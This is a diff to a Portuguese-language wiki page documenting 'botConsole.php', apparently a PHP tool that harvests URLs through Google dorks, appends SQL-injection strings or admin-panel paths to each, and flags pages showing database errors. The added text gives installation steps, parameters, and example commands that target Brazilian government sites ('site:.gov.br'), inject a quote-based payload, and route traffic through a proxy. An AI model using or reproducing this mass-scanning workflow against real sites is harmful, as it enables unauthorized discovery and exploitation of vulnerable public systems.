@@ -50,6 +50,7 @@ inurl:/midia/index.php?id= //Toda url que contenha "/midia/index.php?id="
 
 = Necessário para execução do aplicativo =
 
+||Sistema operacional||	LINUX||
 ||Versão PHP||	5.4.7||
 ||Apache	||2.4||
 ||versão cURL versão||	7.24.0||
@@ -58,9 +59,47 @@ inurl:/midia/index.php?id= //Toda url que contenha "/midia/index.php?id="
 ||PHP allow_url_fopen||	 On||
 ||Permissão||	Leitura & Escrita||
 
-= Details =
+===Instalando pacotes.===
+$sudo apt-get update 
 
-Add your content here.  Format your content with:
-  * Text in *bold* or _italic_
-  * Headings, paragraphs, and lists
-  * Automatic links to other wiki pages
+Em seguida instale os seguintes programas: 
+
+$sudo apt-get install apache2 php5  php5-curl 
+
+OBS:_O script deve ser executado em um terminal._
+
+
+
+    {{{
+    --host="www.google.com.br"
+    --dork="sua dork"
+    --arquivo="seusResultados.txt"
+    --tipoerro="1 ou 2"
+    --exploit="O que vai ser injetado no final de cada url" 
+    --achar="Funciona com Tipoerro 2 para procurar strings personalizadas em cada URL"       
+    --ipproxy="IP PROXY EX: 172.16.0.150"        
+    --porta="PORTA do proxy"
+    }}}
+
+
+     O PARÂMETRO --tipoerro tem duas opções:
+
+     * 1 - O Scanner vai procurar erros padrões do script SQLI(MySQL,MS ACCESS,Microsoft SQL Server,ORACLE,POSTGRESQL) OU ERROS DE PROGRAMAÇÃO.
+         O mesmo vinculado com seu EXPLOIT que pode ser deixado vazio --exploit="" o exploit sempre será usado no final das URL'S,Padrão básico sqlinjection.
+
+     * 2 - Opção para personalizar sua execução onde é habilitado o parâmetro --achar="",Achar funciona para procurar sua definição dentro das urls encontradas.
+
+
+{{{
+
+Ex[1]: --achar="WordPress" isso vai procurar a palavra WordPress em todas urls encontradas pelo scanner.
+Ex[2]: --tipoerro="2" --exploit="wp-login.php"  --achar="WordPress";
+
+php botConsole.php --host="www.google.com.br" --dork="site:.gov.br inurl:php id" --arquivo="resultado.txt" --tipoerro="1" --exploit="--´0x27;"
+php botConsole.php --host="www.google.com.br" --dork="site:.gov.br inurl:php id" --arquivo="resultado.txt" --tipoerro="2" --exploit="/admin/index.php" --achar="version 4.1"
+php botConsole.php --host="www.google.com.br" --dork="site:.gov.br inurl:php id" --arquivo="resultado.txt" --tipoerro="2" --exploit="/admin/index.php" --achar="version 4.1" --ipproxy="172.16.0.150" --porta="8080"
+php botConsole.php ajuda";
+php botConsole.php hosts #Lista de hosts do google.";
+
+
+}}}
